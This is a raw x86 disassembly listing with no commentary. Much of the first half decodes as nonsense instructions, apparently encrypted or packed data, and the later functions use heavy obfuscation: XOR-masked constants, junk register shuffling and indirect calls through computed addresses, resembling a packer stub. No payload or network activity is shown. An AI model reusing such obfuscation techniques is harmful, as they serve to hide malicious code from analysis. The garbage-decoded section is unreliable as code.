  41377d:	mov    es,WORD PTR [ecx-0x2b]
  413780:	mov    ebx,0x3683ea0
  413785:	mov    DWORD PTR [eax+0xf],eax
  413788:	xchg   ebp,eax
  413789:	push   ds
  41378a:	pop    es
  41378b:	sti    
  41378c:	jg     0x4137b7
  41378e:	mov    edi,0x8991229b
  413793:	mov    ah,cl
  413795:	loop   0x413787
  413797:	jle    0x413783
  413799:	push   ds
  41379a:	popf   
  41379b:	test   BYTE PTR [esi],ah
  41379d:	mov    cl,0x90
  41379f:	stc    
  4137a0:	mov    edi,0xb10ff58c
  4137a5:	rol    cl,0x84
  4137a8:	jl     0x4137fd
  4137aa:	ja     0x413822
  4137ac:	ja     0x41382b
  4137ae:	aas    
  4137af:	or     ch,bl
  4137b1:	sbb    ecx,DWORD PTR [ebx-0x4be638bd]
  4137b7:	xor    al,BYTE PTR [ebp-0x5b]
  4137ba:	xchg   bh,dh
  4137bc:	call   0xb82:0x2076a628
  4137c3:	jno    0x413785
  4137c5:	ficomp DWORD PTR [edi+edi*8-0x72]
  4137c9:	mov    ecx,0x2e0f47ea
  4137ce:	and    al,dl
  4137d0:	cld    
  4137d1:	jbe    0x4137c4
  4137d3:	test   edi,esp
  4137d5:	mov    edi,0xb1188429
  4137da:	inc    eax
  4137db:	(bad)  
  4137dc:	push   eax
  4137dd:	lods   al,BYTE PTR ds:[esi]
  4137de:	rcl    ah,cl
  4137e0:	in     al,dx
  4137e1:	jg     0x413846
  4137e3:	sub    ch,ch
  4137e5:	mov    edi,?
  4137e7:	hlt    
  4137e8:	sbb    DWORD PTR [ebp+0x658dbbd7],0xffffffb4
  4137ef:	inc    eax
  4137f0:	pop    DWORD PTR [esi]
  4137f2:	pop    eax
  4137f3:	addr16 test eax,0x99eae691
  4137f9:	lods   al,BYTE PTR ds:[esi]
  4137fa:	ret    
  4137fb:	adc    eax,0x31ef951d
  413800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413801:	sbb    esp,DWORD PTR [edi-0x1d]
  413804:	mul    DWORD PTR [ebx-0x742ec1b7]
  41380a:	xchg   ebp,eax
  41380b:	push   ss
  41380c:	out    dx,al
  41380d:	rol    DWORD PTR [edi],0xd7
  413810:	sbb    bl,BYTE PTR [edi-0x5cfe5031]
  413816:	pop    edx
  413817:	inc    esi
  413818:	xchg   ecx,eax
  413819:	pop    edx
  41381a:	pop    es
  41381b:	adc    BYTE PTR [bx+si+0xea3],cl
  413820:	call   0x129c:0x5f11b865
  413827:	adc    DWORD PTR [edi+0x6a135414],ecx
  41382d:	cdq    
  41382e:	sbb    al,0xb8
  413830:	pop    edi
  413831:	pop    esp
  413832:	mov    esp,0x7b7d45d9
  413837:	leave  
  413838:	div    bh
  41383a:	cmp    ecx,DWORD PTR [edi]
  41383c:	mov    ds:0x4f1adb83,al
  413841:	xor    ecx,DWORD PTR [edi]
  413843:	(bad)  
  413844:	ret    
  413845:	xlat   BYTE PTR ds:[ebx]
  413846:	or     DWORD PTR [edx],edx
  413848:	xchg   ebx,eax
  413849:	in     al,0x8f
  41384b:	neg    DWORD PTR [esi+0x2cc8c56d]
  413851:	fwait
  413852:	and    al,0xf6
  413854:	fidiv  DWORD PTR [ecx]
  413856:	mov    ah,0x37
  413858:	stos   DWORD PTR es:[edi],eax
  413859:	loop   0x413893
  41385b:	cwde   
  41385c:	mov    eax,ds:0x6d3669d2
  413861:	mov    ebx,0xb2cef9c8
  413866:	dec    esp
  413867:	add    al,0xa4
  413869:	hlt    
  41386a:	mov    edi,0xefc14ffa
  41386f:	into   
  413870:	idiv   BYTE PTR [eax+0x6e]
  413873:	cmp    DWORD PTR [ecx+0x462d1b64],esp
  413879:	jbe    0x41384c
  41387b:	test   DWORD PTR [ebp+0x472b63ac],esp
  413881:	dec    ebx
  413882:	pop    esp
  413883:	mov    cl,0x28
  413885:	fs jae 0x4138ef
  413888:	sahf   
  413889:	pop    ss
  41388a:	or     eax,DWORD PTR [edx+0x51003e6b]
  413890:	adc    ebp,DWORD PTR [edi+esi*8+0x37]
  413894:	test   ch,0x1d
  413897:	and    ah,dl
  413899:	pop    ecx
  41389a:	pop    eax
  41389b:	mov    al,0x25
  41389d:	popf   
  41389e:	adc    DWORD PTR [edx+0xa9ee5ab],ebx
  4138a4:	daa    
  4138a5:	idiv   BYTE PTR [ebp-0x11]
  4138a8:	rcr    BYTE PTR [edx+0x472e49b],1
  4138ae:	mov    al,0xec
  4138b0:	test   ch,0x29
  4138b3:	jo     0x41389c
  4138b5:	addr16 adc al,0x8c
  4138b8:	or     BYTE PTR [ecx+0x200ae046],bl
  4138be:	outs   dx,DWORD PTR ds:[esi]
  4138bf:	out    dx,eax
  4138c0:	sbb    al,0x63
  4138c2:	ret    
  4138c3:	adc    ah,0xb0
  4138c6:	mul    esi
  4138c8:	xor    ebp,DWORD PTR [ebx+0x74f17e5f]
  4138ce:	mov    al,0x9d
  4138d0:	cmc    
  4138d1:	push   ebx
  4138d2:	stos   BYTE PTR es:[edi],al
  4138d3:	mov    edi,0xcf044c3a
  4138d8:	mov    eax,0x52505faf
  4138dd:	cwde   
  4138de:	push   esp
  4138df:	pop    ecx
  4138e0:	pop    edx
  4138e1:	loope  0x41389e
  4138e3:	into   
  4138e4:	or     BYTE PTR ds:0xcc3a6260,ch
  4138ea:	mov    dh,0x9b
  4138ec:	pop    ecx
  4138ed:	ror    dl,1
  4138ef:	jo     0x413923
  4138f1:	mov    al,ds:0x35cbfaaa
  4138f6:	out    0xa2,al
  4138f8:	dec    edx
  4138f9:	shr    BYTE PTR [ebp+0x3768f9f8],cl
  4138ff:	push   ds
  413900:	out    0xac,eax
  413902:	push   ebx
  413903:	sbb    DWORD PTR ds:0x3acdce2b,ebp
  413909:	mov    esp,DWORD PTR [eax]
  41390b:	stc    
  41390c:	add    al,0xa2
  41390e:	repnz lea ebp,[esi-0x4303b14d]
  413915:	jecxz  0x41393c
  413917:	fnstcw WORD PTR [ecx-0xff10837]
  41391d:	(bad)  
  41391e:	(bad)  
  41391f:	jmp    0x4138a5
  413921:	mov    ch,BYTE PTR [edx-0x14ba6aa6]
  413927:	inc    edx
  413928:	xchg   ecx,eax
  413929:	xchg   edx,eax
  41392a:	rcl    DWORD PTR [ebp-0x67c442d6],0x40
  413931:	imul   eax,DWORD PTR [ecx],0xffffffb0
  413934:	xchg   edi,eax
  413935:	add    eax,DWORD PTR [eax+0x2956ae2e]
  41393b:	sub    BYTE PTR [esi],ah
  41393d:	(bad)  
  41393f:	cmp    DWORD PTR [edx],esp
  413941:	lahf   
  413942:	mov    WORD PTR ds:0x7769f572,ds
  413948:	mov    BYTE PTR [esi],0x85
  41394b:	pop    ds
  41394c:	int3   
  41394d:	xor    al,0xcd
  41394f:	sahf   
  413950:	mov    bl,0xd9
  413952:	cdq    
  413953:	(bad)  
  413954:	or     eax,0x8f64470e
  413959:	fist   WORD PTR [edx+0x68]
  41395c:	or     al,0x73
  41395e:	das    
  41395f:	aaa    
  413960:	and    eax,0x2a4d91e0
  413965:	xor    bl,BYTE PTR [ebp-0x4398193e]
  41396b:	loop   0x4139b6
  41396d:	dec    edx
  41396e:	push   cs
  41396f:	je     0x4139de
  413971:	xchg   esi,eax
  413972:	icebp  
  413973:	cmp    al,0x5d
  413975:	jnp    0x4139c1
  413977:	jle    0x4139d2
  413979:	fwait
  41397a:	jge    0x4139a4
  41397c:	mul    DWORD PTR [eax+0x72]
  41397f:	push   es
  413980:	jnp    0x4139e2
  413982:	ret    
  413983:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  413985:	and    al,0xd7
  413987:	cmp    dl,BYTE PTR [ebp-0x21fa9fdb]
  41398d:	xor    bh,BYTE PTR [eax]
  41398f:	push   ds
  413990:	std    
  413991:	cwde   
  413992:	and    eax,0x158528f7
  413997:	add    edx,DWORD PTR fs:[esi+0x4ad15a11]
  41399e:	nop
  41399f:	(bad)  
  4139a0:	jb     0x413940
  4139a2:	stos   DWORD PTR es:[edi],eax
  4139a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139a4:	pusha  
  4139a5:	das    
  4139a6:	in     al,dx
  4139a7:	mov    BYTE PTR [esi-0x7b],al
  4139aa:	(bad)  
  4139ab:	in     eax,dx
  4139ac:	xchg   BYTE PTR [esi],al
  4139ae:	xor    ecx,DWORD PTR [ebx-0x6d]
  4139b1:	fiadd  DWORD PTR [ecx-0x217414e8]
  4139b7:	add    BYTE PTR [edi+0x119b82dd],ch
  4139bd:	or     BYTE PTR es:[eax],bh
  4139c0:	(bad)  
  4139c1:	cmc    
  4139c2:	stos   BYTE PTR es:[edi],al
  4139c3:	lds    edx,FWORD PTR [ebx]
  4139c5:	add    DWORD PTR [eax-0x2567dfb4],edx
  4139cb:	je     0x413993
  4139cd:	xor    eax,0xd6e9c985
  4139d2:	push   0xffffff9d
  4139d4:	jne    0x413a53
  4139d6:	fwait
  4139d7:	push   esi
  4139d8:	mul    dh
  4139da:	inc    esp
  4139db:	mov    eax,ds:0xb72e00a3
  4139e0:	inc    eax
  4139e1:	and    bl,BYTE PTR [edx]
  4139e3:	(bad)  
  4139e5:	lods   eax,DWORD PTR ds:[esi]
  4139e6:	mov    ah,0xf0
  4139e8:	push   ss
  4139e9:	leave  
  4139ea:	xchg   BYTE PTR [ecx-0x1c2bda9b],bl
  4139f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139f1:	outs   dx,DWORD PTR ds:[esi]
  4139f2:	outs   dx,DWORD PTR ds:[esi]
  4139f3:	adc    al,BYTE PTR [ebx]
  4139f5:	aam    0x39
  4139f7:	call   FWORD PTR [esi+eiz*2+0x730fd996]
  4139fe:	scas   eax,DWORD PTR es:[edi]
  4139ff:	lods   eax,DWORD PTR ds:[esi]
  413a00:	push   ss
  413a01:	out    dx,eax
  413a02:	inc    edi
  413a03:	push   0xffffffb7
  413a05:	xchg   ebx,eax
  413a06:	fwait
  413a07:	cmp    esi,0xd66a19b
  413a0d:	push   es
  413a0e:	inc    ebp
  413a0f:	imul   edx,edi,0x5ed9c20a
  413a15:	mov    ch,0x3d
  413a17:	inc    edi
  413a18:	xchg   esp,eax
  413a19:	mov    bh,0x7b
  413a1b:	rcl    DWORD PTR [edx],0x61
  413a1e:	mov    dh,0x7a
  413a20:	jmp    FWORD PTR [eax-0x4]
  413a23:	xchg   ebp,eax
  413a24:	ja     0x413a2f
  413a26:	ss push ebx
  413a28:	jmp    0x2236e5fd
  413a2d:	push   ecx
  413a2e:	xor    cl,BYTE PTR [edi-0x13]
  413a31:	and    ecx,DWORD PTR [ecx+edx*8-0x1f]
  413a35:	repz cli 
  413a37:	add    BYTE PTR [ebx],ah
  413a39:	in     eax,0xa3
  413a3b:	sbb    BYTE PTR [ecx-0x7e98f9c4],al
  413a41:	adc    bl,ah
  413a43:	dec    esi
  413a44:	cmp    DWORD PTR [eax+0x5af6332c],edx
  413a4a:	sbb    bl,BYTE PTR [edx+edi*1]
  413a4d:	fst    st(4)
  413a4f:	adc    al,0x64
  413a51:	xor    BYTE PTR [esi],dh
  413a53:	pop    ds
  413a54:	in     al,dx
  413a55:	pop    eax
  413a56:	mov    dh,0xea
  413a58:	call   0xf042cd77
  413a5d:	sti    
  413a5e:	adc    al,0xfc
  413a60:	or     bh,bh
  413a62:	(bad)  
  413a63:	jmp    0x413ac1
  413a65:	jne    0x413a87
  413a67:	loope  0x4139f0
  413a69:	mov    eax,0x63da548b
  413a6e:	mov    eax,0x7780cdf3
  413a73:	push   ebx
  413a74:	cwde   
  413a75:	pushf  
  413a76:	in     al,dx
  413a77:	stc    
  413a78:	(bad)  
  413a79:	int    0xe0
  413a7b:	es pop ss
  413a7d:	mov    ah,0x45
  413a7f:	in     eax,dx
  413a80:	fmul   QWORD PTR [ebx-0x50]
  413a83:	inc    edx
  413a84:	cmp    al,0x97
  413a86:	xor    ebx,edi
  413a88:	and    edi,eax
  413a8a:	(bad)  
  413a8b:	addr16 jb 0x413a22
  413a8e:	dec    edx
  413a8f:	imul   ebx,DWORD PTR [eax+edx*2-0x2a7f04b3],0xc82f99d
  413a9a:	stos   BYTE PTR es:[edi],al
  413a9b:	sbb    DWORD PTR [esi-0x62],esp
  413a9e:	or     DWORD PTR [ebx],ecx
  413aa0:	and    al,0x49
  413aa2:	(bad)  
  413aa3:	sbb    DWORD PTR [ecx-0x5f0f15cc],esi
  413aa9:	sbb    dl,bl
  413aab:	sbb    edx,DWORD PTR [esi]
  413aad:	jnp    0x413ae6
  413aaf:	fs inc ebp
  413ab1:	push   eax
  413ab2:	int    0x77
  413ab4:	sub    ebx,esp
  413ab6:	pop    edx
  413ab7:	clc    
  413ab8:	aaa    
  413ab9:	mov    eax,0xfa2ea059
  413abe:	je     0x413b1c
  413ac0:	and    ch,cl
  413ac2:	dec    esi
  413ac3:	in     eax,0x72
  413ac5:	nop
  413ac6:	push   edi
  413ac7:	fistp  WORD PTR [edi+0x30c05cfd]
  413acd:	add    cl,BYTE PTR [eax-0x2bf9abaf]
  413ad3:	jecxz  0x413b1d
  413ad5:	bound  esp,QWORD PTR [ebx]
  413ad7:	add    esi,DWORD PTR [ebx+0x7b030d09]
  413add:	enter  0xc8ee,0x3c
  413ae1:	int3   
  413ae2:	mov    ch,0xd9
  413ae4:	mov    al,ds:0x6d97c76f
  413ae9:	dec    eax
  413aea:	out    0x84,al
  413aec:	sub    ecx,DWORD PTR [ebp+ebp*8+0x7f]
  413af0:	and    edx,edx
  413af2:	sub    al,0x27
  413af4:	jno    0x413b19
  413af6:	popf   
  413af7:	pusha  
  413af8:	jmp    0x30c4:0x13bd94e5
  413aff:	aas    
  413b00:	inc    ebp
  413b01:	jno    0x413ab6
  413b03:	stc    
  413b04:	xchg   ebx,eax
  413b05:	test   eax,edi
  413b07:	iret   
  413b08:	repz mov ebx,DWORD PTR [edi+0x6636a96b]
  413b0f:	out    0xa7,al
  413b11:	jo     0x413b7b
  413b13:	add    ch,BYTE PTR [edi+0x6d]
  413b16:	push   0xffffffa4
  413b18:	sub    BYTE PTR [eax+0x3d],ah
  413b1b:	xchg   esp,eax
  413b1c:	repnz retf 0xa617
  413b20:	int3   
  413b21:	pop    edi
  413b22:	hlt    
  413b23:	pop    ebp
  413b24:	jnp    0x413b45
  413b26:	xor    al,cl
  413b28:	jb     0x413ae3
  413b2a:	sbb    ecx,DWORD PTR [ecx+0x75]
  413b2d:	out    dx,eax
  413b2e:	jns    0x413abb
  413b30:	lods   al,BYTE PTR ds:[esi]
  413b31:	ds jg  0x413b19
  413b34:	jp     0x413ad7
  413b36:	or     edx,edx
  413b38:	adc    DWORD PTR [edx-0x3a],ebp
  413b3b:	mov    BYTE PTR [ebx-0x3c],cl
  413b3e:	mov    cl,dl
  413b40:	xchg   ebp,eax
  413b41:	mov    bl,0xd1
  413b43:	(bad)  
  413b44:	sti    
  413b45:	test   DWORD PTR [esi+0x10],ebx
  413b48:	xchg   BYTE PTR [ebp+0x76a494b0],dl
  413b4e:	loop   0x413b7c
  413b50:	rol    DWORD PTR [eax],1
  413b52:	arpl   WORD PTR [ebp+0x27ff1ac8],di
  413b58:	js     0x413b16
  413b5a:	and    BYTE PTR [edi+0x19],ch
  413b5d:	pop    esi
  413b5e:	mov    ecx,0x4e445526
  413b63:	cwde   
  413b64:	push   esp
  413b65:	int    0x59
  413b67:	arpl   WORD PTR [ecx+0x63e307d0],cx
  413b6d:	cmp    al,BYTE PTR [edi+0x410905ab]
  413b73:	mov    ch,0xa1
  413b75:	leave  
  413b76:	stos   BYTE PTR es:[edi],al
  413b77:	sbb    BYTE PTR [ecx],bh
  413b79:	aaa    
  413b7a:	les    eax,FWORD PTR [ebx+0x3c5f596d]
  413b80:	cdq    
  413b81:	(bad)  
  413b82:	cs repz push 0xbe9922d
  413b89:	lea    edi,[ebp+0x79]
  413b8c:	cwde   
  413b8d:	and    ebp,esi
  413b8f:	fs mov ah,0xa
  413b92:	aam    0xea
  413b94:	shr    edi,1
  413b96:	in     al,dx
  413b97:	sub    DWORD PTR [ebp+0x3ff04141],eax
  413b9d:	loope  0x413bd6
  413b9f:	and    BYTE PTR [edx],0x2c
  413ba2:	push   ds
  413ba3:	push   ss
  413ba4:	jle    0x413b6c
  413ba6:	(bad)  
  413ba7:	repnz cmc 
  413ba9:	push   edi
  413baa:	loop   0x413b43
  413bac:	pop    edx
  413bad:	sti    
  413bae:	call   0x8247:0x78ea77bd
  413bb5:	push   ecx
  413bb6:	mov    bl,0x9d
  413bb8:	stos   DWORD PTR es:[edi],eax
  413bb9:	pop    edx
  413bba:	arpl   bx,si
  413bbc:	adc    ebp,DWORD PTR [edi]
  413bbe:	mov    esi,esp
  413bc0:	or     BYTE PTR [ecx+0x23],bl
  413bc3:	fiadd  DWORD PTR [edx+0x64291d14]
  413bc9:	cmp    DWORD PTR [ebx+0x1f],edi
  413bcc:	sub    eax,DWORD PTR [esi+0x58f8edec]
  413bd2:	sbb    eax,0x76ac1b92
  413bd7:	xor    al,0xb8
  413bd9:	inc    edi
  413bda:	daa    
  413bdb:	xor    al,al
  413bdd:	jp     0x413b6c
  413bdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413be0:	mov    ss,esi
  413be2:	lds    esi,FWORD PTR [ecx]
  413be4:	mov    ebp,0x5f59518
  413be9:	mov    dl,0xb8
  413beb:	in     al,0x88
  413bed:	xor    bh,bh
  413bef:	cdq    
  413bf0:	mov    esi,0x9092f757
  413bf5:	push   ds
  413bf6:	mov    eax,ds:0x13195edd
  413bfb:	aaa    
  413bfc:	push   0xffffffcb
  413bfe:	jg     0x413bc3
  413c00:	das    
  413c01:	jne    0x413c7f
  413c03:	mov    eax,0x57ad798b
  413c08:	test   eax,0xaf8110d6
  413c0d:	jnp    0x413c24
  413c0f:	test   al,0xf6
  413c11:	pusha  
  413c12:	and    ah,BYTE PTR [ebx-0x66d82791]
  413c18:	(bad)  
  413c1a:	int3   
  413c1b:	ror    DWORD PTR [edi-0x7f680c92],cl
  413c21:	ret    0xe21d
  413c24:	sar    DWORD PTR [ebp-0x36],1
  413c27:	arpl   WORD PTR ds:0xe0c26c52,si
  413c2d:	(bad)
  413c30:	jne    0x413c61
  413c32:	aas    
  413c33:	out    0xc1,al
  413c35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c36:	inc    eax
  413c37:	xor    DWORD PTR [edi+0x7396ac29],ebp
  413c3d:	sbb    BYTE PTR [edx+0x38],ch
  413c40:	push   ebx
  413c41:	mov    DWORD PTR [ecx+0x64d46372],edi
  413c47:	jg     0x413c2c
  413c49:	xlat   BYTE PTR ds:[ebx]
  413c4a:	inc    edx
  413c4b:	xchg   ebp,eax
  413c4c:	cmp    cl,cl
  413c4e:	pop    esp
  413c4f:	cmp    bh,dl
  413c51:	stc    
  413c52:	shr    DWORD PTR [edi+0x42],0x15
  413c56:	push   es
  413c57:	sub    BYTE PTR fs:[edx+0x77],ch
  413c5b:	sbb    al,0xff
  413c5d:	push   0xffffff8b
  413c5f:	xor    dl,BYTE PTR [ecx]
  413c61:	mov    WORD PTR ds:0x4d7fb661,es
  413c67:	jmp    0xa9fbff41
  413c6c:	repz mov ebp,0x71ac7b69
  413c72:	adc    bh,BYTE PTR [edx+0x3d]
  413c75:	je     0x413c94
  413c77:	jl     0x413ce6
  413c79:	sbb    DWORD PTR [ecx+ebx*2-0x3d],0xc36f9084
  413c81:	inc    edi
  413c82:	xchg   esi,eax
  413c83:	pushf  
  413c84:	and    ebp,DWORD PTR [esi+0x3aa793b7]
  413c8a:	xchg   esp,eax
  413c8b:	sub    al,0x73
  413c8d:	sbb    eax,0x519ad2c
  413c92:	(bad)  
  413c93:	call   DWORD PTR [esi]
  413c95:	mov    ebx,0x83c1eae1
  413c9a:	cdq    
  413c9b:	mov    ebx,0xdb216807
  413ca0:	lock call 0x7d2f:0x598a2f34
  413ca8:	leave  
  413ca9:	or     DWORD PTR [edx-0x3117b96f],ecx
  413caf:	arpl   WORD PTR [ebx-0xe],dx
  413cb2:	sub    BYTE PTR [edx+0x75],cl
  413cb5:	iret   
  413cb6:	pop    ebx
  413cb7:	adc    esp,DWORD PTR [ebx]
  413cb9:	push   eax
  413cba:	(bad)  
  413cbb:	pop    ebp
  413cbc:	xlat   BYTE PTR ds:[ebx]
  413cbd:	jbe    0x413ca1
  413cbf:	mov    eax,0x4691952d
  413cc4:	jmp    0x46ca:0xaab90264
  413ccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ccc:	xor    al,0xb6
  413cce:	xchg   BYTE PTR [ebx+0x494be14d],ch
  413cd4:	pop    ebp
  413cd5:	test   BYTE PTR [ebp-0x1a],0xaf
  413cd9:	in     al,dx
  413cda:	fiadd  WORD PTR [ecx+0x33]
  413cdd:	push   ds
  413cde:	cmp    DWORD PTR [ebx+0x6d33de32],eax
  413ce4:	call   FWORD PTR [esi-0x43]
  413ce7:	push   ss
  413ce8:	xchg   esi,eax
  413ce9:	test   al,0xa
  413ceb:	adc    cl,BYTE PTR [ebx]
  413ced:	dec    ecx
  413cee:	push   cs
  413cef:	sbb    dh,BYTE PTR [ebx+0x65]
  413cf2:	mov    esp,0x36bbbec5
  413cf7:	ss leave 
  413cf9:	cmp    BYTE PTR [eax],al
  413cfb:	retf   
  413cfc:	push   esi
  413cfd:	in     al,dx
  413cfe:	mov    ecx,DWORD PTR [ebp-0x14]
  413d01:	mov    eax,DWORD PTR [ecx+eax*4]
  413d04:	mov    DWORD PTR [ebp-0x38],eax
  413d07:	jmp    0x40f5ba
  413d0c:	mov    eax,DWORD PTR [ebp-0xc]
  413d0f:	xor    eax,esi
  413d11:	lea    ebx,[ebx+eax*1+0x3272f1]
  413d18:	jmp    0x40ac84
  413d1d:	mov    eax,DWORD PTR [ebp-0x4]
  413d20:	xor    eax,esi
  413d22:	add    eax,edi
  413d24:	jmp    0x413e48
  413d29:	mov    eax,DWORD PTR [ebp-0x38]
  413d2c:	add    eax,DWORD PTR [ebp+0x8]
  413d2f:	mov    DWORD PTR [ebp-0x18],eax
  413d32:	mov    eax,DWORD PTR [ebp-0x1c]
  413d35:	test   eax,eax
  413d37:	je     0x413dd1
  413d3d:	mov    DWORD PTR [ebp-0x20],0x0
  413d44:	push   0x3
  413d46:	xor    edx,edx
  413d48:	pop    edx
  413d49:	add    edx,0x8
  413d4c:	push   edx
  413d4d:	pop    ecx
  413d4e:	push   0x6
  413d50:	dec    ecx
  413d51:	pop    ebx
  413d52:	dec    ebx
  413d53:	xchg   ebx,ecx
  413d55:	sub    ebx,ecx
  413d57:	xchg   ebx,ecx
  413d59:	dec    ecx
  413d5a:	mov    eax,DWORD PTR [ebp-0x1c]
  413d5d:	imul   eax,ecx
  413d60:	sub    esp,eax
  413d62:	mov    DWORD PTR [ebp-0x20],esp
  413d65:	mov    eax,DWORD PTR [ebp-0x4]
  413d68:	xor    eax,esi
  413d6a:	add    eax,edi
  413d6c:	jmp    0x413daa
  413d71:	mov    ecx,DWORD PTR [ebp-0xc]
  413d74:	mov    eax,DWORD PTR [ebp+0x8]
  413d77:	mov    edx,DWORD PTR [ebp+0x14]
  413d7a:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  413d7e:	xor    ecx,esi
  413d80:	add    ecx,edi
  413d82:	xor    edx,edx
  413d84:	div    ecx
  413d86:	mov    ecx,DWORD PTR [ebp-0x4]
  413d89:	xor    ecx,esi
  413d8b:	lea    eax,[ecx+eax*1+0x3272f1]
  413d92:	mov    ecx,DWORD PTR [ebp+0x8]
  413d95:	mov    edx,DWORD PTR [ebp-0x20]
  413d98:	mov    DWORD PTR [edx+ecx*4],eax
  413d9b:	mov    eax,DWORD PTR [ebp-0xc]
  413d9e:	mov    ecx,DWORD PTR [ebp+0x8]
  413da1:	xor    eax,esi
  413da3:	lea    eax,[eax+ecx*1+0x3272f1]
  413daa:	mov    DWORD PTR [ebp+0x8],eax
  413dad:	mov    eax,DWORD PTR [ebp-0xc]
  413db0:	mov    ecx,DWORD PTR [ebp+0x14]
  413db3:	xor    eax,esi
  413db5:	add    eax,edi
  413db7:	imul   eax,DWORD PTR [ecx]
  413dba:	mov    ecx,DWORD PTR [ebp-0x4]
  413dbd:	mov    edx,DWORD PTR [ebp+0x8]
  413dc0:	xor    ecx,esi
  413dc2:	lea    ecx,[ecx+edx*1+0x3272f1]
  413dc9:	cmp    ecx,eax
  413dcb:	jne    0x413d71
  413dd1:	mov    eax,DWORD PTR [ebp-0x4]
  413dd4:	xor    eax,esi
  413dd6:	add    eax,edi
  413dd8:	mov    DWORD PTR [ebp-0x10],eax
  413ddb:	mov    ebx,0x65655
  413de0:	add    ebx,0x3234
  413de6:	xchg   ebx,esi
  413de8:	xor    ebx,ebx
  413dea:	push   esi
  413deb:	mov    esi,ebx
  413ded:	pop    ebx
  413dee:	mov    edx,esi
  413df0:	add    ebx,0x1002
  413df6:	lea    eax,[ebp-0x18]
  413df9:	add    edx,eax
  413dfb:	add    edx,0x5
  413dfe:	push   edx
  413dff:	inc    esi
  413e00:	pop    ecx
  413e01:	dec    ecx
  413e02:	xchg   ecx,eax
  413e03:	dec    eax
  413e04:	xchg   ecx,eax
  413e05:	dec    ecx
  413e06:	xchg   ecx,edx
  413e08:	dec    edx
  413e09:	push   edx
  413e0a:	mov    edx,ebx
  413e0c:	pop    ebx
  413e0d:	dec    ebx
  413e0e:	call   DWORD PTR [ebx]
  413e10:	cmp    DWORD PTR [ebp+0x10],esi
  413e13:	je     0x413e34
  413e19:	xchg   edx,eax
  413e1a:	push   0xc
  413e1c:	pop    ecx
  413e1d:	dec    ecx
  413e1e:	push   0x3
  413e20:	pop    ebx
  413e21:	inc    ebx
  413e22:	xchg   ebx,ecx
  413e24:	inc    ecx
  413e25:	sub    ebx,ecx
  413e27:	xchg   ebx,ecx
  413e29:	dec    ecx
  413e2a:	dec    ecx
  413e2b:	mov    eax,DWORD PTR [ebp-0x1c]
  413e2e:	imul   eax,ecx
  413e31:	add    esp,eax
  413e33:	xchg   edx,eax
  413e34:	push   eax
  413e35:	xor    ebx,ebx
  413e37:	mov    edx,esp
  413e39:	dec    edx
  413e3a:	inc    ebx
  413e3b:	add    ebx,DWORD PTR [edx+ebx*1]
  413e3e:	dec    ebx
  413e3f:	xor    edx,edx
  413e41:	add    DWORD PTR [ebp-0x10],ebx
  413e44:	pop    ebx
  413e45:	mov    eax,DWORD PTR [ebp-0x10]
  413e48:	pop    edi
  413e49:	pop    esi
  413e4a:	pop    ebx
  413e4b:	leave  
  413e4c:	ret    0x10
  413e4f:	push   ebp
  413e50:	mov    ebp,esp
  413e52:	push   ecx
  413e53:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  413e5a:	sub    ecx,edx
  413e5c:	mov    eax,DWORD PTR [ebp-0x4]
  413e5f:	mov    edx,DWORD PTR [ebp+0x10]
  413e62:	adc    DWORD PTR ds:0x42a2aa,ecx
  413e68:	mov    ecx,0x75108aa
  413e6d:	xor    eax,ecx
  413e6f:	sub    DWORD PTR ds:0x42a2d2,0x42a2ee
  413e79:	add    eax,0x3272f1
  413e7e:	mov    DWORD PTR [edx],eax
  413e80:	movzx  eax,BYTE PTR ds:0x42a2b6
  413e87:	sub    eax,DWORD PTR ds:0x42a2b2
  413e8d:	mov    ds:0x42a2b6,eax
  413e92:	mov    eax,DWORD PTR [ebp+0xc]
  413e95:	xor    eax,ecx
  413e97:	push   esi
  413e98:	mov    esi,DWORD PTR [ebp+0x10]
  413e9b:	and    DWORD PTR ds:0x42a2ae,0x0
  413ea5:	jmp    0x413eb7
  413eaa:	mov    edx,DWORD PTR ds:0x42a2ae
  413eb0:	inc    edx
  413eb1:	mov    DWORD PTR ds:0x42a2ae,edx
  413eb7:	cmp    DWORD PTR ds:0x42a2ae,0x15
  413ebe:	jae    0x413eee
  413ec4:	cmp    DWORD PTR ds:0x42a2ae,0x1b
  413ecb:	jl     0x413eee
  413ed1:	jmp    0x413ee9
  413ed6:	push   0x4a7a
  413edb:	push   0x52a4
  413ee0:	push   DWORD PTR [ebp-0x20]
  413ee3:	call   DWORD PTR ds:0x42a412
  413ee9:	jmp    0x413eaa
  413eee:	mov    edx,0x3272f1
  413ef3:	add    eax,edx
  413ef5:	mov    DWORD PTR [esi+0x4],eax
  413ef8:	mov    eax,DWORD PTR [ebp+0x14]
  413efb:	mov    esi,DWORD PTR [ebp+0x10]
  413efe:	mov    DWORD PTR [esi+0x8],eax
  413f01:	mov    eax,DWORD PTR [ebp+0x18]
  413f04:	mov    esi,DWORD PTR [ebp+0x10]
  413f07:	mov    DWORD PTR [esi+0xc],eax
  413f0a:	mov    eax,DWORD PTR [ebp+0x1c]
  413f0d:	mov    esi,DWORD PTR [ebp+0x10]
  413f10:	mov    DWORD PTR [esi+0x10],eax
  413f13:	mov    eax,DWORD PTR [ebp+0x8]
  413f16:	xor    eax,ecx
  413f18:	add    eax,edx
  413f1a:	pop    esi
  413f1b:	leave  
  413f1c:	ret    0x18
  413f1f:	push   ebp
  413f20:	mov    ebp,esp
  413f22:	sub    esp,0x9c
  413f28:	mov    ecx,DWORD PTR [ebp+0x8]
  413f2b:	add    DWORD PTR ds:0x42a2be,ecx
  413f31:	mov    eax,0x8a98
  413f36:	adc    DWORD PTR ds:0x42a2de,0x457a
  413f40:	xor    ax,WORD PTR [ecx+0x20]
  413f44:	mov    ecx,0x3b5a
  413f49:	adc    DWORD PTR ds:0x42a296,0x42a262
  413f53:	add    ax,cx
  413f56:	movzx  eax,ax
  413f59:	sub    ecx,DWORD PTR ds:0x42a276
  413f5f:	mov    DWORD PTR [ebp-0x10],eax
  413f62:	mov    BYTE PTR [ebp-0x1],0x7c
